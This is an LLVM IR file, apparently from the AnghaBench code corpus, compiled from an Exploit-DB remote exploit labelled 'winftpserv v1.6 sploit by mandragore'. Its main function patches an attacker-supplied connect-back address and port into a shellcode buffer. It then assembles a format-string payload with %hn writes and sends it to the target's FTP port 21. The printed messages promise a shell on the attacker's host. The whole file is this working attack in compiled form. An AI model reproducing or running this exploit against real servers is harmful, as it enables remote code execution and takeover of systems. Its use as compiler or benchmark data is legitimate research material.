; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23531.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23531.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [48 x i8] c"[%%] winftpserv v1.6 sploit by mandragore (v2)\0A\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"d:h:p:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [47 x i8] c"[.] if working you'll have a shell on %s:%d .\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"[.] launching attack on %s..\0A\00", align 1
@sc = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [5 x i8] c"xyzy\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"%08x\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"%s%%0%dx%%hn%%0%dx%%hn\0D\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [14 x i8] c"[-] connect()\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"[+] done.\0A\00", align 1
@port = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  store i32 16777343, i32* %8, align 4
  store i32 80, i32* %9, align 4
  store i32 1598044203, i32* %10, align 4
  store i32 49795, i32* %11, align 4
  store i32 58111, i32* %12, align 4
  store i32 828, i32* %13, align 4
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %26

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @usage(i8* %24)
  br label %26

26:                                               ; preds = %21, %2
  br label %27

27:                                               ; preds = %49, %26
  %28 = load i32, i32* %4, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = call i32 @getopt(i32 %28, i8** %29, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 %30, i32* %17, align 4
  %31 = load i32, i32* @EOF, align 4
  %32 = icmp ne i32 %30, %31
  br i1 %32, label %33, label %50

33:                                               ; preds = %27
  %34 = load i32, i32* %17, align 4
  switch i32 %34, label %44 [
    i32 100, label %35
    i32 104, label %38
    i32 112, label %41
  ]

35:                                               ; preds = %33
  %36 = load i32, i32* @optarg, align 4
  %37 = call i32 @inet_addr(i32 %36)
  store i32 %37, i32* %7, align 4
  br label %49

38:                                               ; preds = %33
  %39 = load i32, i32* @optarg, align 4
  %40 = call i32 @inet_addr(i32 %39)
  store i32 %40, i32* %8, align 4
  br label %49

41:                                               ; preds = %33
  %42 = load i32, i32* @optarg, align 4
  %43 = call i32 @atoi(i32 %42)
  store i32 %43, i32* %9, align 4
  br label %49

44:                                               ; preds = %33
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @usage(i8* %47)
  br label %49

49:                                               ; preds = %44, %41, %38, %35
  br label %27

50:                                               ; preds = %27
  %51 = load i32, i32* %7, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %56, label %53

53:                                               ; preds = %50
  %54 = load i32, i32* %8, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %61

56:                                               ; preds = %53, %50
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @usage(i8* %59)
  br label %61

61:                                               ; preds = %56, %53
  %62 = bitcast i32* %8 to %struct.in_addr*
  %63 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %62, i32 0, i32 0
  %64 = load i32, i32* %63, align 4
  %65 = call i8* @inet_ntoa(i32 %64)
  %66 = load i32, i32* %9, align 4
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.2, i64 0, i64 0), i8* %65, i32 %66)
  %68 = bitcast i32* %7 to %struct.in_addr*
  %69 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %68, i32 0, i32 0
  %70 = load i32, i32* %69, align 4
  %71 = call i8* @inet_ntoa(i32 %70)
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i8* %71)
  %73 = load i32, i32* %9, align 4
  %74 = xor i32 %73, 38550
  store i32 %74, i32* %9, align 4
  %75 = load i32, i32* %9, align 4
  %76 = and i32 %75, 255
  %77 = shl i32 %76, 8
  %78 = load i32, i32* %9, align 4
  %79 = ashr i32 %78, 8
  %80 = or i32 %77, %79
  store i32 %80, i32* %9, align 4
  %81 = load i8*, i8** @sc, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 17
  %83 = getelementptr inbounds i8, i8* %82, i64 18
  %84 = getelementptr inbounds i8, i8* %83, i64 90
  %85 = call i32 @memcpy(i8* %84, i32* %9, i32 2)
  %86 = load i32, i32* %8, align 4
  %87 = xor i32 %86, -1768515946
  store i32 %87, i32* %8, align 4
  %88 = load i8*, i8** @sc, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 17
  %90 = getelementptr inbounds i8, i8* %89, i64 18
  %91 = getelementptr inbounds i8, i8* %90, i64 83
  %92 = call i32 @memcpy(i8* %91, i32* %8, i32 4)
  %93 = call i64 @malloc(i32 4096)
  %94 = inttoptr i64 %93 to i8*
  store i8* %94, i8** %14, align 8
  %95 = load i8*, i8** %14, align 8
  %96 = call i32 @bzero(i8* %95, i32 4096)
  %97 = load i8*, i8** %14, align 8
  %98 = call i32 @memcpy(i8* %97, i32* %10, i32 4)
  %99 = load i8*, i8** %14, align 8
  %100 = call i32 @strcat(i8* %99, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %101 = load i32, i32* %10, align 4
  %102 = add nsw i32 %101, 3
  store i32 %102, i32* %10, align 4
  %103 = load i8*, i8** %14, align 8
  %104 = getelementptr inbounds i8, i8* %103, i64 8
  %105 = call i32 @memcpy(i8* %104, i32* %10, i32 4)
  %106 = load i8*, i8** %14, align 8
  %107 = load i8*, i8** @sc, align 8
  %108 = load i8*, i8** @sc, align 8
  %109 = call i32 @strlen(i8* %108)
  %110 = call i32 @strncat(i8* %106, i8* %107, i32 %109)
  store i32 0, i32* %17, align 4
  br label %111

111:                                              ; preds = %120, %61
  %112 = load i32, i32* %17, align 4
  %113 = load i32, i32* %13, align 4
  %114 = sub nsw i32 %113, 1
  %115 = sdiv i32 %114, 4
  %116 = icmp slt i32 %112, %115
  br i1 %116, label %117, label %123

117:                                              ; preds = %111
  %118 = load i8*, i8** %14, align 8
  %119 = call i32 @strcat(i8* %118, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  br label %120

120:                                              ; preds = %117
  %121 = load i32, i32* %17, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %17, align 4
  br label %111

123:                                              ; preds = %111
  %124 = load i8*, i8** %14, align 8
  %125 = load i8*, i8** %14, align 8
  %126 = load i32, i32* %11, align 4
  %127 = load i8*, i8** @sc, align 8
  %128 = call i32 @strlen(i8* %127)
  %129 = sub nsw i32 %126, %128
  %130 = load i32, i32* %13, align 4
  %131 = sub nsw i32 %130, 1
  %132 = sdiv i32 %131, 4
  %133 = mul nsw i32 %132, 8
  %134 = sub nsw i32 %129, %133
  %135 = sub nsw i32 %134, 12
  %136 = sub nsw i32 %135, 7
  %137 = load i32, i32* %12, align 4
  %138 = load i32, i32* %11, align 4
  %139 = sub nsw i32 %137, %138
  %140 = call i32 @sprintf(i8* %124, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0), i8* %125, i32 %136, i32 %139)
  %141 = load i32, i32* @AF_INET, align 4
  %142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %141, i32* %142, align 4
  %143 = load i32, i32* %7, align 4
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %145 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %144, i32 0, i32 0
  store i32 %143, i32* %145, align 4
  %146 = call i32 @htons(i32 21)
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %146, i32* %147, align 4
  %148 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %148, i32* %15, align 4
  %149 = load i32, i32* %15, align 4
  %150 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %151 = call i32 @connect(i32 %149, %struct.sockaddr* %150, i32 12)
  store i32 %151, i32* %16, align 4
  %152 = load i32, i32* %16, align 4
  %153 = icmp eq i32 %152, -1
  br i1 %153, label %154, label %157

154:                                              ; preds = %123
  %155 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  %156 = call i32 @exit(i32 1) #3
  unreachable

157:                                              ; preds = %123
  %158 = load i32, i32* %15, align 4
  %159 = load i8*, i8** %14, align 8
  %160 = load i8*, i8** %14, align 8
  %161 = call i32 @strlen(i8* %160)
  %162 = call i32 @send(i32 %158, i8* %159, i32 %161, i32 0)
  %163 = load i32, i32* %15, align 4
  %164 = load i8*, i8** %14, align 8
  %165 = call i32 @recv(i32 %163, i8* %164, i32 1024, i32 0)
  %166 = load i32, i32* %15, align 4
  %167 = call i32 @close(i32 %166)
  %168 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0))
  %169 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
